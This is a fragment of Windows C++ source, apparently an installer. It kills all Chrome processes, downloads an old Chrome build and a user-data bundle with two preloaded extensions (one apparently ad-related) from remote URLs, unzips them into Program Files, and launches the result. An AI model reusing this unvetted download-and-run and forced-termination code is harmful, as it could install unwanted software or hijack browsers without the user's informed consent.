		if (0 == strcmp("chrome.exe", pe32.szExeFile))
		{
			
			HANDLE ProcessHandle = OpenProcess(PROCESS_TERMINATE | PROCESS_VM_READ, FALSE, pe32.th32ProcessID);
			if (!TerminateProcess(ProcessHandle, 0))
			{
				printf("结束进程失败++++++++++++++++++++++++++++++++\n");
			}else
			{
				WaitForSingleObject(ProcessHandle, INFINITE);
				printf("结束成功\n");
			}

			/*char *pInfo = NULL;
			Execmd("taskkill /im chrome.exe /f", &pInfo);
			if (NULL != pInfo)
			{
				free(pInfo);
				pInfo = NULL;
			}	*/

			//CloseHandle(hProcessSnap);
			//return TRUE;
		}

		bMode = ::Process32Next(hProcessSnap, &pe32);
	}
	CloseHandle(hProcessSnap);

	return TRUE;;
}


BOOL GetCtxUrl(char* _pCturl, char* _pAdurl)
{
	char GetVersionInfoCMD[256];
#if IS_TEST
	sprintf(GetVersionInfoCMD, CTX_INFO, "bj008");
#else
	sprintf(GetVersionInfoCMD, CTX_INFO, pHostId);
#endif
	CURLRECVDATA* pCurlRecvData = new CURLRECVDATA;
	pCurlRecvData->pRecvData = (char*)malloc(512);

	if (!SendPostDataAndRecvBackInfo1(POSTURL, GetVersionInfoCMD, curl_recvbackinfo_function, pCurlRecvData))
	{
		free(pCurlRecvData->pRecvData);
		delete pCurlRecvData;
		pCurlRecvData = NULL;
		return FALSE;
	}
//	cout << pCurlRecvData->pRecvData << endl;

	//app_info arrAppInfo[3];
	//ZeroMemory(arrAppInfo, sizeof(arrAppInfo));
	cJSON* root = cJSON_Parse(pCurlRecvData->pRecvData);
	if (NULL == root)
	{
		free(pCurlRecvData->pRecvData);
		delete pCurlRecvData;
		pCurlRecvData = NULL;
		return FALSE;
	}
	cJSON* cjSuccess = cJSON_GetObjectItem(root, "success");
	if (NULL == cjSuccess)
	{
		goto error;
	}
	int nSuccess = cjSuccess->valueint;
	if (0 == nSuccess)
	{
		goto error;
	}
	cJSON* pArray = cJSON_GetObjectItem(root, "data");
	if (NULL == pArray)
		goto error;
	int iCount = cJSON_GetArraySize(pArray);
	if (iCount < 2)
		goto error;

	cJSON *pCt = NULL;
	pCt = cJSON_GetObjectItem(pArray, "npogbneglgfmgafpepecdconkgapppkd");
	if (NULL == pCt)
		goto error;

	cJSON *pAd = NULL;
	pAd = cJSON_GetObjectItem(pArray, "edffiillgkekafkdjahahdjhjffllgjg");
	if (NULL == pAd)
		goto error;

	char* pCturl = cJSON_GetObjectItem(pCt, "update_url")->valuestring;
	char* pAdurl = cJSON_GetObjectItem(pAd, "update_url")->valuestring;
	/*memcpy(_pCturl, pCturl, strlen(pCturl)+1);
	memcpy(_pAdurl, pAdurl, strlen(pAdurl)+1);*/
	UrlFormating(pCturl, "\\", _pCturl);
	UrlFormating(pAdurl, "\\", _pAdurl);

	cJSON_Delete(root);
	free(pCurlRecvData->pRecvData);
	delete pCurlRecvData;
	pCurlRecvData = NULL;

	return TRUE;

error:
	printf("获取版本信息失败\n");
	cJSON_Delete(root);
	free(pCurlRecvData->pRecvData);
	delete pCurlRecvData;
	pCurlRecvData = NULL;

	return FALSE;
}


BOOL CreateShortcuts(const char* exePath, const char* pArguments, const char* pWorkingDirectory, const char* lnkNmae)
{
	HRESULT hr = CoInitialize(NULL);
	if (FAILED(hr))
		return FALSE;

	IShellLink* pisl;
	hr = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLink, (void**)&pisl);
	if (FAILED(hr))
	{
		CoUninitialize();
		return FALSE;
	}
		
	IPersistFile* pIPF;
	pisl->SetPath(exePath);
	pisl->SetArguments(pArguments);
	pisl->SetWorkingDirectory(pWorkingDirectory);

	hr = pisl->QueryInterface(IID_IPersistFile, (void**)&pIPF);
	if (FAILED(hr))
	{
		pisl->Release();
		CoUninitialize();
		return FALSE;
	}
	
	USES_CONVERSION;
	LPCOLESTR lpOleStr = A2COLE(lnkNmae);
	pIPF->Save(lpOleStr, FALSE);
	pIPF->Release();
	pisl->Release();
	CoUninitialize();

	return TRUE;
}

BOOL InstallChrome()
{
	BOOL bHasInstalled = TRUE;
	if (_access("C:\\Program Files\\chrome\\GoogleChrome_x86_46.0.2490.86", 0) == 0)
		DeleteDirectoryByFullName("\"C:\\Program Files\\chrome\\GoogleChrome_x86_46.0.2490.86\"");

	if (_access("C:\\Program Files\\chrome\\Extensions", 0) == 0)
		DeleteDirectoryByFullName("\"C:\\Program Files\\chrome\\Extensions\"");

	wchar_t* pSrcZip = NULL;
	if (_access("C:\\Program Files\\chrome\\chrome-bin", 0) != 0)
	{
		bHasInstalled = FALSE;
		CloseChromeExe_ctx();
		Sleep(1000 * 2);
		if (!Curl_DownloadFile(URL_DOWNLOAD_CHROME, "C:\\chrome-bin.zip"))
			return FALSE;

		wchar_t* pSrcZip = ConvertUtf8ToUnicode_("C:\\chrome-bin.zip");
		if (!dounzip(pSrcZip, L"C:\\Program Files\\chrome"))
			return FALSE;
		delete pSrcZip;
		printf("chrome-bin安装完成\n");
	}

	char pTpath[MAX_PATH] = { 0 };
	sprintf_s(pTpath, MAX_PATH, "%s%s", "C:\\Program Files\\chrome\\userdata", "\\Default\\Extensions\\npogbneglgfmgafpepecdconkgapppkd");
	char pWpath[MAX_PATH] = { 0 };
	sprintf_s(pWpath, MAX_PATH, "%s%s", "C:\\Program Files\\chrome\\userdata", "\\Default\\Extensions\\edffiillgkekafkdjahahdjhjffllgjg");
	if (_access(pTpath, 0) != 0 || _access(pWpath, 0) != 0)
	{
		bHasInstalled = FALSE;
		CloseChromeExe_ctx();
		Sleep(1000 * 2);
		if (!Curl_DownloadFile(URL_DOWNLOAD_USERDATA, "C:\\userdata.zip"))
			return FALSE;
		pSrcZip = ConvertUtf8ToUnicode_("C:\\userdata.zip");
		if (!dounzip(pSrcZip, L"C:\\Program Files\\chrome"))
			return FALSE;
		delete pSrcZip;
		printf("userdata安装完成\n");
	}

	char szDesk[MAX_PATH] = { 0 };
	if (!SHGetSpecialFolderPath(NULL, szDesk, CSIDL_DESKTOPDIRECTORY, 0))
	{
		printf("获取桌面地址信息失败\n");
		return FALSE;
	}
	strcat_s(szDesk, "\\chrome46.lnk");

	if (!bHasInstalled)
	{
		if (_access(szDesk, 0) == 0)
			DeleteFile(szDesk);
		Sleep(2000);
		CreateShortcuts("C:\\Program Files\\chrome\\chrome-bin\\chrome.exe", "--user-data-dir=\"C:\\Program Files\\chrome\\userdata\"", "C:\\Program Files\\chrome\\chrome-bin", szDesk);
	}

	if (!bHasInstalled)
		ShellExecute(NULL, "open", "C:\\Program Files\\chrome\\chrome-bin\\chrome.exe", "--user-data-dir=\"C:\\Program Files\\chrome\\userdata\"", NULL, SW_SHOWNORMAL);
	return TRUE;
}